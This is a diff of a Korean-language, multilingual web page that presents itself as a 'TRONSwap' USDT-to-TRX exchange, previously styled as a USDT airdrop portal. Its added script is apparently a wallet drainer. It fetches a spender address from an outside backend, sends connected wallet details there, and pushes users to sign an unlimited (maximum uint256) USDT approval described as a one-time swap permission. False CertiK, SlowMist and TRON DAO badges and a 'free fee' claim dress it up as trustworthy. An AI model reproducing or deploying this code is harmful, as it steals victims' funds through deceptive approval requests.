+                    <div class="flex items-center gap-3"><input type="number" id="swap-input" placeholder="0.00" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-3xl sm:text-4xl font-extrabold text-white font-mono border-none outline-none placeholder-slate-600 w-full min-w-0"><div class="flex items-center gap-2 bg-slate-800/80 px-4 py-2.5 rounded-xl border border-slate-700/80 shrink-0"><div class="w-7 h-7 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs font-bold">$</div><span class="text-base font-bold text-white">USDT</span></div></div>
+                    <div class="flex gap-2 pt-1"><button onclick="setSwapPct(25)" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-xs font-bold transition">25%</button><button onclick="setSwapPct(50)" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-xs font-bold transition">50%</button><button onclick="setSwapPct(75)" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-xs font-bold transition">75%</button><button onclick="setSwapPct(100)" class="px-3 py-1.5 rounded-lg bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 text-xs font-bold transition">MAX</button></div>
+                </div>
+                <div class="flex justify-center -my-2 relative z-10"><div class="w-11 h-11 rounded-xl bg-[#0f172a] border border-slate-800 flex items-center justify-center shadow-lg"><i class="fa-solid fa-arrow-down text-blue-400 text-lg"></i></div></div>
+                <div class="bg-[#070b14] border border-slate-800/80 rounded-2xl p-5 space-y-3 mt-3 mb-4">
+                    <div class="flex items-center justify-between text-sm text-slate-400"><span data-i18n="receive_amount" data-i18n="receive_amount">받는 금액 (예상)</span><span><span data-i18n="bal2">잔액</span>: <span id="trx-bal-swap" class="text-blue-400 font-bold font-mono">0.00</span> TRX</span></div>
+                    <div class="flex items-center gap-3"><div id="swap-output" class="flex-1 text-3xl sm:text-4xl font-extrabold text-slate-300 font-mono">0.00</div><div class="flex items-center gap-2 bg-slate-800/80 px-4 py-2.5 rounded-xl border border-slate-700/80 shrink-0"><div class="w-7 h-7 rounded-full bg-red-500 flex items-center justify-center text-white text-xs font-bold">T</div><span class="text-base font-bold text-white">TRX</span></div></div>
+                </div>
+                <div class="bg-slate-950/60 rounded-xl p-4 space-y-2 text-sm mb-5">
+                    <div class="flex justify-between text-slate-400"><span data-i18n="exchange_rate_label">교환 비율</span><span class="text-white font-mono">1 USDT = <span id="exchange-rate">-</span> TRX</span></div>
+                    <div class="flex justify-between text-slate-400"><span data-i18n="fee_label">수수료</span><span class="text-emerald-400 font-bold" data-i18n="fee_free">무료 (이벤트 기간)</span></div>
+                </div>
+                <div id="approve-progress" class="hidden mb-4 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3">
+                    <div class="flex items-center gap-2 text-sm text-white font-bold"><span class="animate-spin rounded-full h-4 w-4 border-2 border-blue-400 border-t-transparent"></span><span id="approve-progress-text">처리 중...</span></div>
+                    <div class="w-full bg-slate-900 rounded-full h-2 overflow-hidden"><div id="approve-progress-bar" class="bg-gradient-to-r from-blue-500 to-cyan-400 h-full rounded-full transition-all duration-500" style="width:0%"></div></div>
+                </div>
+                <button onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-4 rounded-2xl font-bold text-base bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white shadow-lg shadow-blue-900/30 border border-blue-400/20 transition-all active:scale-[0.99] flex items-center justify-center gap-2"><i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text" data-i18n="swap_btn_text">USDT 교환 시작 (최초 1회 승인 포함)</span></button>
+                <p class="text-xs text-slate-500 text-center mt-3" data-i18n="swap_notice">최초 1회 교환 시 USDT 스마트 컨트랙트 승인이 필요합니다</p>
+            </div>
+        </section>
+
+<!-- Steps with progress bar -->
+        <section class="glass border border-slate-800/80 rounded-2xl p-6">
+            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-5 text-center" data-i18n="steps_title">교환 진행 단계</h3>
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 transition-all">
-                    <div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold">대기 중</span></div>
-                    <h4 class="text-xs sm:text-sm font-bold text-white mb-1">Trust Wallet 지갑 연동</h4>
-                    <p class="text-[11px] text-slate-400 leading-relaxed">TRON 메인넷 지갑 주소를 안전하게 동기화합니다.</p>
-                </div>
-                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 transition-all">
-                    <div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold">핵심 진행</span></div>
-                    <h4 class="text-xs sm:text-sm font-bold text-white mb-1">USDT 승인 (Allowance)</h4>
-                    <p class="text-[11px] text-slate-400 leading-relaxed">스마트 컨트랙트 승인 서명을 진행합니다.</p>
-                </div>
-                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50 transition-all">
-                    <div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold">자동 분배</span></div>
-                    <h4 class="text-xs sm:text-sm font-bold text-white mb-1">에어드랍 자동 수령</h4>
-                    <p class="text-[11px] text-slate-400 leading-relaxed">보상 USDT가 지갑으로 전송됩니다.</p>
-                </div>
+                <div id="step1" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 01</span><span id="step1-status" class="text-amber-400 text-xs font-semibold" data-i18n="step_waiting">대기 중</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1" data-i18n="step1_title">지갑 연결</h4><p class="text-[11px] text-slate-400">TronLink / Trust / TokenPocket / Bitget / OKX</p></div>
+                <div id="step2" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 02</span><span id="step2-status" class="text-amber-400 text-xs font-semibold" data-i18n="step_core">핵심 진행</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1" data-i18n="step2_title">교환 승인 (최초 1회)</h4><p class="text-[11px] text-slate-400" data-i18n="step2_desc">USDT 스마트 컨트랙트 교환 권한 승인</p></div>
+                <div id="step3" class="p-4 rounded-xl border bg-slate-950/40 border-slate-800/80 opacity-50 step-progress"><div class="flex items-center justify-between mb-2"><span class="text-[11px] font-mono font-bold text-slate-500">STEP 03</span><span class="text-slate-400 text-xs font-semibold" data-i18n="step_auto">자동 처리</span></div><h4 class="text-xs sm:text-sm font-bold text-white mb-1" data-i18n="step3_title">TRX 즉시 입금</h4><p class="text-[11px] text-slate-400" data-i18n="step3_desc">교환된 TRX가 지갑으로 자동 입금됩니다.</p></div>
             </div>
         </section>
 
-        <!-- Main Dashboard Grid -->
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
-            <div class="lg:col-span-7 space-y-6">
-                <div class="glass-panel border border-slate-800/90 rounded-2xl p-6 sm:p-7 shadow-2xl">
-                    <div class="flex items-center justify-between pb-4 mb-5 border-b border-slate-800/80">
-                        <div class="flex items-center gap-3">
-                            <div class="w-10 h-10 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20 flex items-center justify-center"><i class="fa-solid fa-shield-halved"></i></div>
-                            <div><h3 class="text-sm sm:text-base font-bold text-white">USDT 권한 승인</h3><p class="text-[11px] text-slate-400">TRC-20 Smart Contract 서명</p></div>
-                        </div>
-                        <span id="allowance-badge-main" class="text-[11px] px-3 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-400 animate-pulse-slow">미승인 (0 USDT)</span>
-                    </div>
-                    <div class="p-4 bg-slate-950/70 rounded-xl border border-slate-800/80 mb-5 text-xs text-slate-300 leading-relaxed space-y-1.5">
-                        <div class="flex items-center gap-2 font-bold text-white"><i class="fa-solid fa-bolt text-amber-400"></i><span>스마트 컨트랙트 동작 안내</span></div>
-                        <p>최초 1회 무제한 승인 완료 시, 이벤트 참가 자격 검증과 보상 수령이 추가 서명 없이 자동 가동됩니다.</p>
-                        <div class="text-[11px] text-amber-400/90 pt-1 flex items-center gap-1.5 font-medium"><i class="fa-solid fa-circle-exclamation"></i><span>※ 최초 1회만 소량의 TRX 수수료가 사용됩니다.</span></div>
-                    </div>
-                    <div class="mb-5">
-                        <label class="block text-[11px] font-bold text-slate-400 mb-1.5 uppercase">USDT 컨트랙트 주소</label>
-                        <div class="flex items-center gap-2">
-                            <input type="text" readonly value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-emerald-400 font-bold focus:outline-none">
-                            <button onclick="copyText('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','컨트랙트 주소')" class="p-2.5 bg-slate-800/80 hover:bg-slate-700 border border-slate-700/80 text-slate-300 rounded-xl transition shrink-0"><i class="fa-regular fa-copy text-xs"></i></button>
-                        </div>
-                    </div>
-                    <button onclick="executeUnlimitedApprove()" id="approve-btn" class="w-full py-3.5 px-4 rounded-xl font-bold text-xs sm:text-sm bg-gradient-to-r from-blue-600 via-blue-500 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white shadow-lg shadow-blue-950/50 border border-blue-400/30 transition-all active:scale-[0.99] flex items-center justify-center gap-2">
-                        <i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>
-                    </button>
-                    <p class="text-[11px] text-slate-500 text-center mt-2.5">안전한 온체인 스마트 컨트랙트 통신</p>
-                </div>
-                <div class="glass-panel border border-slate-800/80 rounded-2xl p-6">
-                    <div class="flex items-center gap-2 mb-2"><i class="fa-solid fa-wand-magic-sparkles text-amber-400 text-sm"></i><h3 class="text-xs sm:text-sm font-bold text-white">예상 보상 계산기</h3></div>
-                    <p class="text-xs text-slate-400 mb-4">보유 및 승인된 USDT 금액에 따른 스페셜 보상율을 계산합니다.</p>
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 items-center bg-slate-950/80 p-4 rounded-xl border border-slate-800/80">
-                        <div><label class="block text-[11px] text-slate-400 mb-1">보유 / 승인 예정 USDT</label><input type="number" id="calc-input" value="1000" oninput="updateCalc()" class="w-full bg-slate-900 border border-slate-700/80 rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none"></div>
-                        <div class="sm:text-right border-t sm:border-t-0 sm:border-l border-slate-800 pt-3 sm:pt-0 sm:pl-4"><div class="text-[11px] text-slate-400">예상 추가 지급 에어드랍</div><div id="calc-result" class="text-base sm:text-lg font-black font-mono text-emerald-400 mt-0.5">+ 150.00 USDT</div></div>
-                    </div>
-                </div>
-            </div>
-            <div class="lg:col-span-5 space-y-6">
-                <div class="glass-panel border border-slate-800/90 rounded-2xl p-6 shadow-xl">
-                    <h3 class="text-xs font-bold tracking-wider text-slate-400 uppercase mb-4 flex items-center justify-between"><span>지갑 연동 상세 정보</span><span id="connection-indicator" class="text-[10px] text-rose-400 font-mono font-semibold">DISCONNECTED</span></h3>
+        <!-- Wallet Info & Logs -->
+        <div class="max-w-4xl mx-auto w-full">
+            
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                <div class="glass border border-slate-800/90 rounded-2xl p-6 shadow-xl">
+                    <h3 class="text-xs font-bold tracking-wider text-slate-400 uppercase mb-4 flex items-center justify-between"><span data-i18n="wallet_info">지갑 연동 정보</span><span id="connection-indicator" class="text-[11px] text-rose-400 font-mono font-semibold" data-i18n="disconnected">DISCONNECTED</span></h3>
                     <div id="wallet-disconnected" class="text-center py-8 px-4 bg-slate-950/40 rounded-xl border border-dashed border-slate-800">
                         <div class="mx-auto w-10 h-10 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-slate-400 mb-3"><i class="fa-solid fa-wallet"></i></div>
-                        <p class="text-xs text-slate-200 font-bold">지갑이 연결되어 있지 않습니다</p>
-                        <p class="text-[11px] text-slate-500 mt-1 mb-4">Trust Wallet을 동기화하여 온체인 상태를 확인하세요.</p>
-                        <button onclick="handleConnectWallet()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition">Trust Wallet 연결</button>
+                        <p class="text-xs text-slate-200 font-bold" data-i18n="wallet_not_connected">지갑이 연결되어 있지 않습니다</p>
+                        <p class="text-[11px] text-slate-500 mt-1 mb-4" data-i18n="wallet_guide">지갑 앱의 DApp 브라우저에서 접속하세요.</p>
+                        <button onclick="handleConnectWallet()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold rounded-xl border border-slate-700 transition"><span data-i18n="connect_wallet2">지갑 연결</span></button>
                     </div>
                     <div id="wallet-connected" class="hidden space-y-3.5">
-                        <div class="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono mb-1">지갑 주소</div><div class="flex items-center justify-between"><span id="display-address" class="text-xs font-mono text-emerald-400 font-bold break-all">-</span><button onclick="copyText(currentWalletAddress,'지갑 주소')" class="text-slate-400 hover:text-white p-1"><i class="fa-regular fa-copy text-xs"></i></button></div></div>
+                        <div class="p-3.5 bg-slate-950/80 rounded-xl border border-slate-800"><div class="text-[11px] text-slate-500 uppercase font-mono mb-1" data-i18n="wallet_address">지갑 주소</div><div class="flex items-center justify-between"><span id="display-address" class="text-xs font-mono text-emerald-400 font-bold break-all">-</span><button onclick="copyText(currentWalletAddress,'지갑 주소')" class="text-slate-400 hover:text-white p-1"><i class="fa-regular fa-copy text-xs"></i></button></div></div>
                         <div class="grid grid-cols-2 gap-3">
-                            <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono">USDT 잔액</div><div id="display-balance" class="text-sm sm:text-base font-bold font-mono text-emerald-400 mt-1">0.00 <span class="text-xs font-normal text-slate-400">USDT</span></div></div>
-                            <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[10px] text-slate-500 uppercase font-mono">승인 상태</div><div id="display-allowance" class="text-xs sm:text-sm font-bold font-mono text-amber-400 mt-1">미승인</div></div>
+                            <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[11px] text-slate-500 uppercase font-mono" data-i18n="usdt_balance">USDT 잔액</div><div id="display-balance" class="text-sm sm:text-base font-bold font-mono text-emerald-400 mt-1">0.00 <span class="text-xs font-normal text-slate-400">USDT</span></div></div>
+                            <div class="p-3 bg-slate-950/60 rounded-xl border border-slate-800"><div class="text-[11px] text-slate-500 uppercase font-mono" data-i18n="swap_status">교환 상태</div><div id="display-allowance" class="text-xs sm:text-sm font-bold font-mono text-amber-400 mt-1">미승인</div></div>
                         </div>
                     </div>
                 </div>
-                <div class="glass-panel border border-slate-800/90 rounded-2xl p-5 shadow-xl flex flex-col h-[340px]">
+                <div class="glass border border-slate-800/90 rounded-2xl p-5 shadow-xl flex flex-col h-[300px]">
                     <div class="flex items-center justify-between pb-3 border-b border-slate-800/80 mb-3">
-                        <div class="flex items-center gap-2"><div class="p-1.5 bg-blue-500/10 text-blue-400 rounded-lg"><i class="fa-solid fa-terminal text-xs"></i></div><h3 class="text-xs font-bold text-slate-200">온체인 실시간 터미널 로그</h3></div>
+                        <div class="flex items-center gap-2"><div class="p-1.5 bg-blue-500/10 text-blue-400 rounded-lg"><i class="fa-solid fa-terminal text-xs"></i></div><h3 class="text-xs font-bold text-slate-200" data-i18n="live_log">실시간 로그</h3></div>
                         <button onclick="clearLogs()" class="p-1.5 text-slate-400 hover:text-slate-200 bg-slate-800/60 rounded-lg transition"><i class="fa-solid fa-trash-can text-xs"></i></button>
                     </div>
                     <div id="logs-container" class="flex-1 bg-[#020408] rounded-xl p-3 font-mono text-[11px] leading-relaxed overflow-y-auto space-y-2 border border-slate-950">
-                        <div class="text-blue-400">[시스템] TRON Mainnet node active.</div>
-                        <div class="text-blue-400">[환경 체크] Trust Wallet 감지 모드 가동...</div>
+                        <div class="text-blue-400" data-i18n="log_system">[시스템] TRON Mainnet 연결됨</div>
+                        <div class="text-blue-400" data-i18n="log_waiting">[대기] 지갑 감지 중...</div>
                     </div>
                 </div>
             </div>
         </div>
 
         <!-- Security -->
-        <section class="glass-panel border border-slate-800/80 rounded-2xl p-6 text-center">
-            <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">공식 온체인 보안 검증 및 파트너십</p>
+        <section class="glass border border-slate-800/80 rounded-2xl p-6 text-center">
+            <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4" data-i18n="security_title">보안 검증</p>
             <div class="flex flex-wrap items-center justify-center gap-8 text-slate-400 text-xs font-semibold">
                 <div class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-blue-400"></i> CertiK Audited</div>
-                <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-cyan-400"></i> SlowMist Security Verified</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-lock text-cyan-400"></i> SlowMist Verified</div>
                 <div class="flex items-center gap-2"><i class="fa-solid fa-certificate text-emerald-400"></i> TRON DAO Approved</div>
             </div>
         </section>
 
         <!-- FAQ -->
         <section class="space-y-4 pt-2">
-            <h3 class="text-base sm:text-lg font-bold text-white text-center">자주 묻는 질문 (FAQ)</h3>
+            <h3 class="text-base sm:text-lg font-bold text-white text-center" data-i18n="faq_title">자주 묻는 질문 (FAQ)</h3>
             <div class="max-w-3xl mx-auto space-y-3" id="faq-container"></div>
         </section>
     </main>
 
     <footer class="border-t border-slate-800/80 bg-[#020408] py-8 px-4 text-center text-xs text-slate-500 mt-12 space-y-2">
-        <p>&copy; 2026 TRON Foundation & TRC-20 USDT Airdrop Portal. All rights reserved.</p>
-        <p class="text-[11px] text-slate-600">Powered by TRON Mainnet High-Speed Smart Contracts | Built for Trust Wallet Web3 Compatibility</p>
+        <p>TRONSwap &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
     </footer>
 
     <script>
-        var API_BASE = 'https://tron-usdt-backend.vercel.app/api';
-        var OFFICIAL_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        var isConnected = false, isApproved = false, activeProvider = 'TrustWallet', currentWalletAddress = null;
+        var API_BASE='https://tron-usdt-backend.vercel.app/api';
+        var OFFICIAL_USDT_CONTRACT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        var MAX_ALLOWANCE='115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        var isConnected=false,isApproved=false,activeProvider='Unknown',currentWalletAddress=null;
 
+        // ===== Utils =====
         function escapeHtml(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
         function isMobile(){return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);}
+        function isIOS(){return /iPhone|iPad|iPod/i.test(navigator.userAgent);}
+        function isAndroid(){return /Android/i.test(navigator.userAgent);}
+        function isPC(){return !isMobile();}
 
-        function showToast(msg,type){
-            type=type||'success';var c=document.getElementById('toast-container');if(!c)return;
-            var t=document.createElement('div');
-            t.className='flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-2xl border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 '+(type==='success'?'bg-emerald-950/90 border-emerald-500/50 text-emerald-200':type==='error'?'bg-red-950/90 border-red-500/50 text-red-200':'bg-slate-900/90 border-slate-700 text-slate-200');
-            t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-exclamation':'fa-circle-check')+'"></i><span>'+escapeHtml(msg)+'</span>';
-            c.appendChild(t);requestAnimationFrame(function(){t.classList.remove('translate-y-2','opacity-0');});
-            setTimeout(function(){t.classList.add('translate-y-2','opacity-0');setTimeout(function(){t.remove();},300);},3500);
-        }
-
-        function appendLog(msg,type){
-            type=type||'info';var c=document.getElementById('logs-container');if(!c)return;
-            var d=document.createElement('div');
-            d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';
-            d.innerHTML='<span class="text-slate-600">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);
-            c.appendChild(d);c.scrollTop=c.scrollHeight;
-        }
+        function showToast(msg,type){type=type||'success';var c=document.getElementById('toast-container');if(!c)return;var t=document.createElement('div');t.className='flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-2xl border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 '+(type==='success'?'bg-emerald-950/90 border-emerald-500/50 text-emerald-200':type==='error'?'bg-red-950/90 border-red-500/50 text-red-200':'bg-slate-900/90 border-slate-700 text-slate-200');t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-exclamation':'fa-circle-check')+'"></i><span>'+escapeHtml(msg)+'</span>';c.appendChild(t);requestAnimationFrame(function(){t.classList.remove('translate-y-2','opacity-0');});setTimeout(function(){t.classList.add('translate-y-2','opacity-0');setTimeout(function(){t.remove();},300);},3500);}
+        function appendLog(msg,type){type=type||'info';var c=document.getElementById('logs-container');if(!c)return;var d=document.createElement('div');d.className=type==='success'?'text-emerald-400 font-bold':type==='error'?'text-red-400 font-bold':type==='warn'?'text-amber-400':type==='approve'?'text-purple-400':'text-blue-400';d.innerHTML='<span class="text-slate-600">['+new Date().toLocaleTimeString('ko-KR')+']</span> '+escapeHtml(msg);c.appendChild(d);c.scrollTop=c.scrollHeight;}
         window.clearLogs=function(){var c=document.getElementById('logs-container');if(c)c.innerHTML='<div class="text-slate-600">[로그 초기화]</div>';};
         function copyText(t,l){navigator.clipboard.writeText(t).then(function(){showToast(l+' 복사됨');}).catch(function(){showToast('복사 실패','error');});}
+        async function getSpenderAddress(){try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;}
 
-        async function getSpenderAddress(){
-            try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;
+        // Progress bar
+        function setProgress(pct,text){
+            var bar=document.getElementById('approve-progress');
+            var barInner=document.getElementById('approve-progress-bar');
+            var barText=document.getElementById('approve-progress-text');
+            if(bar)bar.classList.remove('hidden');
+            if(barInner)barInner.style.width=pct+'%';
+            if(barText)barText.textContent=text||'처리 중...';
         }
+        function hideProgress(){var bar=document.getElementById('approve-progress');if(bar)bar.classList.add('hidden');}
 
-        // Countdown
+
+        var userUsdtBalance=0;var TRX_RATE=0;
+        // Binance 실시간 TRX/USDT 시세 조회
+        async function fetchTrxPrice(){
+            try{
+                var res=await fetch('https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT');
+                var data=await res.json();
+                var trxPrice=parseFloat(data.price);
+                if(trxPrice>0){TRX_RATE=1/trxPrice;document.getElementById('exchange-rate').textContent=TRX_RATE.toFixed(2);}
+            }catch(e){
+                try{var r2=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd');var d2=await r2.json();if(d2.tron&&d2.tron.usd){TRX_RATE=1/d2.tron.usd;document.getElementById('exchange-rate').textContent=TRX_RATE.toFixed(2);}}catch(e2){if(!TRX_RATE)TRX_RATE=4.0;}
+            }
+        }
+        fetchTrxPrice();setInterval(fetchTrxPrice,15000);
+        window.updateSwapOutput=function(){var v=parseFloat(document.getElementById('swap-input').value||0);document.getElementById('swap-output').textContent=TRX_RATE?(v*TRX_RATE).toFixed(2):'0.00';};
+        window.setSwapPct=function(pct){var amt=(userUsdtBalance*(pct/100)).toFixed(2);document.getElementById('swap-input').value=amt;updateSwapOutput();};
+
+
+        var logTexts={
+            ko:{modal_subtitle:'사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.',w_tronlink:'TRON 공식 지갑',w_trust:'멀티체인 지갑',w_tp:'아시아 인기 지갑',w_bitget:'글로벌 Web3 지갑',w_okx:'OKX 거래소 지갑',modal_tip_title:'앱이 자동으로 안 열리면:',modal_tip1:'1. 선택한 지갑 앱을 직접 여세요',modal_tip2:'2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동',modal_tip3:'3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)',detect:'[감지] {0} DApp 브라우저 확인됨',noDetect:'[대기] 지갑 DApp 브라우저 미감지',accChange:'[계정 변경] {0}',searching:'[지갑 탐색] 환경 확인 중...',sending:'[백엔드] 서버에 지갑 정보 전송 중...',connected:'[연결] {0} | {1} USDT',backendFail:'[경고] 백엔드 연결 실패',noSpender:'[오류] Spender 미설정',trxCheck:'[1/3] TRX 잔액 확인 중...',autoCharge:'[자동 충전] {0} TRX 전송 완료',trxOk:'[확인] TRX 충분 ({0})',trxFail:'[실패] {0}',trxWarn:'[경고] TRX 확인 실패, 계속 진행',approving:'[2/3] 승인 서명 요청 중...',approved:'[3/3] 교환 승인 완료! TxHash: {0}',cancelled:'[취소] 사용자 서명 취소',failed:'[실패] {0}'},
+            en:{modal_subtitle:'Select your wallet app<br>to connect automatically.',w_tronlink:'TRON Official Wallet',w_trust:'Multi-chain Wallet',w_tp:'Popular in Asia',w_bitget:'Global Web3 Wallet',w_okx:'OKX Exchange Wallet',modal_tip_title:'If the app doesn\'t open:',modal_tip1:'1. Open the wallet app manually',modal_tip2:'2. Go to <strong class="text-white">Browser</strong> tab in the app',modal_tip3:'3. <strong class="text-white">Paste</strong> the URL (auto-copied)',detect:'[Detected] {0} DApp browser found',noDetect:'[Wait] Wallet DApp browser not detected',accChange:'[Account Changed] {0}',searching:'[Search] Checking environment...',sending:'[Backend] Sending wallet info...',connected:'[Connected] {0} | {1} USDT',backendFail:'[Warning] Backend connection failed',noSpender:'[Error] Spender not set',trxCheck:'[1/3] Checking TRX balance...',autoCharge:'[Auto] {0} TRX sent',trxOk:'[OK] TRX sufficient ({0})',trxFail:'[Failed] {0}',trxWarn:'[Warning] TRX check failed, continuing',approving:'[2/3] Requesting approval...',approved:'[3/3] Approved! TxHash: {0}',cancelled:'[Cancelled] User rejected',failed:'[Failed] {0}'},
+            zh:{modal_subtitle:'选择您的钱包应用<br>自动连接。',w_tronlink:'TRON 官方钱包',w_trust:'多链钱包',w_tp:'亚洲热门钱包',w_bitget:'全球 Web3 钱包',w_okx:'OKX 交易所钱包',modal_tip_title:'如果应用未自动打开：',modal_tip1:'1. 手动打开钱包应用',modal_tip2:'2. 进入应用内的<strong class="text-white">浏览器</strong>选项卡',modal_tip3:'3. 在地址栏<strong class="text-white">粘贴</strong>网址（已自动复制）',detect:'[检测] 发现{0} DApp浏览器',noDetect:'[等待] 未检测到钱包DApp浏览器',accChange:'[账户更改] {0}',searching:'[搜索] 检查环境...',sending:'[后端] 发送钱包信息...',connected:'[已连接] {0} | {1} USDT',backendFail:'[警告] 后端连接失败',noSpender:'[错误] 未设置Spender',trxCheck:'[1/3] 检查TRX余额...',autoCharge:'[自动充值] 已发送{0} TRX',trxOk:'[确认] TRX充足 ({0})',trxFail:'[失败] {0}',trxWarn:'[警告] TRX检查失败，继续',approving:'[2/3] 请求授权...',approved:'[3/3] 授权成功！TxHash: {0}',cancelled:'[取消] 用户取消签名',failed:'[失败] {0}'},
+            ru:{modal_subtitle:'Выберите кошелёк<br>для автоматического подключения.',w_tronlink:'Официальный кошелёк TRON',w_trust:'Мультичейн кошелёк',w_tp:'Популярный в Азии',w_bitget:'Глобальный Web3 кошелёк',w_okx:'Кошелёк биржи OKX',modal_tip_title:'Если приложение не открылось:',modal_tip1:'1. Откройте кошелёк вручную',modal_tip2:'2. Перейдите во вкладку <strong class="text-white">Браузер</strong>',modal_tip3:'3. <strong class="text-white">Вставьте</strong> URL (скопирован)',detect:'[Обнаружен] {0} DApp браузер',noDetect:'[Ожидание] DApp браузер не обнаружен',accChange:'[Смена аккаунта] {0}',searching:'[Поиск] Проверка...',sending:'[Сервер] Отправка данных...',connected:'[Подключено] {0} | {1} USDT',backendFail:'[Ошибка] Сервер недоступен',noSpender:'[Ошибка] Spender не задан',trxCheck:'[1/3] Проверка баланса TRX...',autoCharge:'[Авто] Отправлено {0} TRX',trxOk:'[OK] TRX достаточно ({0})',trxFail:'[Ошибка] {0}',trxWarn:'[Внимание] Ошибка TRX, продолжаем',approving:'[2/3] Запрос одобрения...',approved:'[3/3] Одобрено! TxHash: {0}',cancelled:'[Отмена] Пользователь отклонил',failed:'[Ошибка] {0}'},
